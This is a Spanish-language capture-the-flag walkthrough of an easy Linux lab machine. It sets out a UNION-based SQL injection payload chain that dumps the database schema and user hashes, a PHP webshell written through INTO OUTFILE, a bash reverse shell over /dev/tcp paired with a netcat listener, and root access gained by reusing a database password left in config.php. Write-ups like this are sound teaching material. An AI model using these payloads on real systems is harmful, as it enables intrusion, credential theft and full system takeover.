**Dificultad:** Easy 🟢  \
**OS:** Linux 🐧

# Enumeración 🔎

## Nmap
```console
PORT       STATE   SERVICE         
22/tcp     open    ssh             
80/tcp     open    http
4566/tcp   open    http (Forbidden)
8080/tcp   open    http (Bad Gateway)
```

En el puerto 80 nos encontramos una página de registro en la que podemos introducir nuestro nombre, seleccionar un país y pulsar el botón **Join Now**.

El campo de texto es vulnerable a:
- HTML Injection
- XSS
- SQL Injection

Siendo la **SQL Injection** la vulnerabilidad que explotaremos.

# Explotación ⚔️

Abrimos **Burp Suite** para realizar la SQLi de forma más cómoda.

### Enumeramos la base de datos en uso

**Petición**
```http
username=admin&country=Brazil' UNION SELECT database()-- -
```

**Respuesta**
```text
registration
```

---

### Enumeramos todas las bases de datos

**Petición**
```http
username=admin&country=Brazil' UNION SELECT schema_name FROM information_schema.schemata-- -
```

**Respuesta**
```text
information_schema
performance_schema
mysql
registration
```

---

### Enumeramos las tablas de la base de datos `registration`

**Petición**
```http
username=admin&country=Brazil' UNION SELECT table_name FROM information_schema.tables WHERE table_schema="registration"-- -
```

**Respuesta**
```text
registration
```

---

### Enumeramos las columnas de la tabla `registration`

**Petición**
```http
username=admin&country=Brazil' UNION SELECT column_name FROM information_schema.columns WHERE table_schema="registration" AND table_name="registration"-- -
```

**Respuesta**
```text
username
userhash
country
regtime
```

---

### Volcamos el contenido de las columnas `username` y `userhash`

**Petición**
```http
username=admin&country=Brazil' UNION SELECT group_concat(username,0x3a,userhash) FROM registration-- -
```

**Respuesta**
```text
usuario:hash
```

Estas credenciales no nos sirven, ya que corresponden a nuestro propio usuario y no a ningún otro con el que podamos obtener acceso adicional.

---

### Probamos a subir un archivo de prueba

**Petición**
```http
username=admin&country=Brazil' UNION SELECT "prueba" INTO OUTFILE "/var/www/html/prueba.txt"-- -
```

**Respuesta**
```text
Request: http://IP/prueba.txt
Response: prueba
```

Vemos que el archivo se ha subido correctamente y que podemos visualizar su contenido. A continuación, haremos lo mismo con un archivo PHP para comprobar si podemos subirlo y ejecutarlo.

---

### Subida de un archivo PHP (webshell)

**Petición**
```http
username=admin&country=Brazil' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/prueba.php"-- -
```

**Respuesta**
```text
Request: http://IP/prueba.php?cmd=whoami
Response: www-data
```

---

Nos ponemos en escucha con **netcat**:
```bash
nc -lvnp PUERTO
```

Enviamos una reverse shell. Es importante recordar URL-encodear el carácter `&` como `%26`:
```http
http://IP/prueba.php?cmd=bash -c "bash -i >%26/dev/tcp/IP/PUERTO 0>%261"
```

---

## User Flag 🏳️

Podemos encontrar la *user flag* en el directorio `/home` del usuario `htb`:
```bash
www-data@validation:/home/htb$ ls
user.txt
```

---

## Root Flag 👑

Listando los archivos del directorio `/var/www/html` nos llama la atención el archivo `config.php`:
```bash
www-data@validation:/var/www/html$ ls
account.php
config.php
css
index.php
js
prueba.php
```

Al revisar su contenido encontramos un usuario y una contraseña:
```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Probamos la contraseña con el usuario `root`:
```bash
www-data@validation:/var/www/html$ su root
Password:
```

La contraseña funciona y obtenemos acceso como `root`:
```bash
# whoami
root
```

La *root flag* se encuentra en el directorio `/root`.

